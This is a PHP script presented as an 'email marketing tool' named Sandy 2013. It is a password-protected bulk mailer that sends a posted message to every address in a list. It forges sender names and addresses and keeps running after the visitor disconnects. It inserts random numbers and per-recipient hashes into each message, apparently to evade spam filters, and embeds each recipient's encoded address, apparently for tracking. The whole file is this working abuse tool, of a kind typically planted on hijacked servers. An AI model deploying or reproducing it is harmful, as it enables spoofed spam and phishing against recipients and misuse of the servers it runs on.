<?php
/* Sandy 2013 - Best Email Marketing Tool */
set_time_limit(0);
ignore_user_abort(true);

        $ac = $_POST['ac'];                                                                                                                                                                                                     
        $Verify=$_POST['Verify'];
        $From=$_POST['From'];
        $RealName=$_POST['RealName'];
        $Subject=$_POST['Subject'];
        $MailBody=$_POST['MailBody'];
        $MailList=$_POST['MailList'];
        $Format=$_POST['Format'];
        $Encoding=$_POST['Encoding'];
        $Delay=$_POST['Delay'];

        $SandyKey=$_POST['SandyKey'];
        $SandyNRA=$_POST['SandyNRA'];
        $SandyNRB=$_POST['SandyNRB'];
        $SandyRNA=$_POST['SandyRNA'];
        $SandyRNB=$_POST['SandyRNB'];
        $CodeSize=$_POST['CodeSize'];

        $SANDY_SERVER=$_SERVER['SERVER_NAME'];

/* Access Protection */
  $protection="1af98609adf796b21c9fc735e31c57b7";
  if(md5($Verify)!==$protection){ exit; }


 if ($ac=="go"){
  $MailBody = urlencode($MailBody);
  $MailBody = ereg_replace("%5C%22", "%22", $MailBody);
  $MailBody = urldecode($MailBody);
  $MailBody = stripslashes($MailBody);
  $Subject = stripslashes($Subject); }

 if ($ac=="go"){
 if (!$From && !$Subject && !$MailBody && !$MailList){
 print "Fields missing.";
 exit;
 }
  $allemails = split("\n", $MailList);
  $nm = count($allemails);
 for($x=0; $x<$nm; $x++){
  $to = $allemails[$x];
  $Dest = explode("/", $to);
  $Destination = $Dest[0];

 if ($Destination){                
  $Destination = ereg_replace(" ", "", $Destination);
  $MailBody = ereg_replace("&email&", $Destination, $MailBody);
  $Subject = ereg_replace("&email&", $Destination, $Subject);
  $nrmail=$x+1;
  $domain = substr($From, strpos($From, "@"), strlen($From));

  /* Template Zone */
  $SANDY_NR = rand($SandyNRA,$SandyNRB);
  $SANDY_RN = rand($SandyRNA,$SandyRNB);
  $SANDY_HASH = md5("$Destination+$SandyKey");
  $SANDY_CODE_LOWER = substr("$SANDY_HASH", $CodeSize);
  $SANDY_CODE_UPPER = strtoupper($SANDY_CODE_LOWER);
  $SANDY_NAME = $Dest[1];
  $SANDY_UMAIL = base64_encode($Destination);

  $From1 = str_replace("SANDY_NR", $SANDY_NR, $From);
  $From2 = str_replace("SANDY_RN", $SANDY_RN, $From1);
  $From3 = str_replace("SANDY_HASH", $SANDY_HASH, $From2);
  $From4 = str_replace("SANDY_CODE_LOWER", $SANDY_CODE_LOWER, $From3);
  $From5 = str_replace("SANDY_CODE_UPPER", $SANDY_CODE_UPPER, $From4);
  

  $RealName1 = str_replace("SANDY_NR", $SANDY_NR, $RealName);
  $RealName2 = str_replace("SANDY_RN", $SANDY_RN, $RealName1);
  $RealName3 = str_replace("SANDY_HASH", $SANDY_HASH, $RealName2);
  $RealName4 = str_replace("SANDY_CODE_LOWER", $SANDY_CODE_LOWER, $RealName3);
  $RealName5 = str_replace("SANDY_CODE_UPPER", $SANDY_CODE_UPPER, $RealName4);

  $MailBody1 = str_replace("SANDY_NR", $SANDY_NR, $MailBody);
  $MailBody2 = str_replace("SANDY_RN", $SANDY_RN, $MailBody1);
  $MailBody3 = str_replace("SANDY_HASH", $SANDY_HASH, $MailBody2);
  $MailBody4 = str_replace("SANDY_NAME", $SANDY_NAME, $MailBody3);
  $MailBody5 = str_replace("SANDY_DESTINATION", $Destination, $MailBody4);
  $MailBody6 = str_replace("SANDY_CODE_LOWER", $SANDY_CODE_LOWER, $MailBody5);
  $MailBody7 = str_replace("SANDY_CODE_UPPER", $SANDY_CODE_UPPER, $MailBody6);
  $MailBody8 = str_replace("SANDY_UMAIL", $SANDY_UMAIL, $MailBody7); 


  $Subject1 = str_replace("SANDY_NR", $SANDY_NR, $Subject);
  $Subject2 = str_replace("SANDY_RN", $SANDY_RN, $Subject1);
  $Subject3 = str_replace("SANDY_HASH", $SANDY_HASH, $Subject2);
  $Subject4 = str_replace("SANDY_NAME", $SANDY_NAME, $Subject3);
  $Subject5 = str_replace("SANDY_DESTINATION", $Destination, $Subject4);
  $Subject6 = str_replace("SANDY_CODE_LOWER", $SANDY_CODE_LOWER, $Subject5);
  $Subject7 = str_replace("SANDY_CODE_UPPER", $SANDY_CODE_UPPER, $Subject6);
  $Subject8 = str_replace("SANDY_SERVER", $SANDY_SERVER, $Subject7);

/* Sending Mail */
 print "$nrmail:$nm:$Destination";
 if($Delay != 0) { sleep($Delay); }
 flush();
  $header = "From: $RealName5 <$From5>\r\n";
  $header .= "MIME-Version: 1.0\r\n";
  $header .= "Content-Type: $Format\r\n";
  $header .= "Content-Transfer-Encoding: $Encoding\r\n\r\n";
  $header .= "$MailBody8\r\n";
 mail($Destination, $Subject8, "", $header);
 print "\n";
 flush();
    }
  }
}
?>

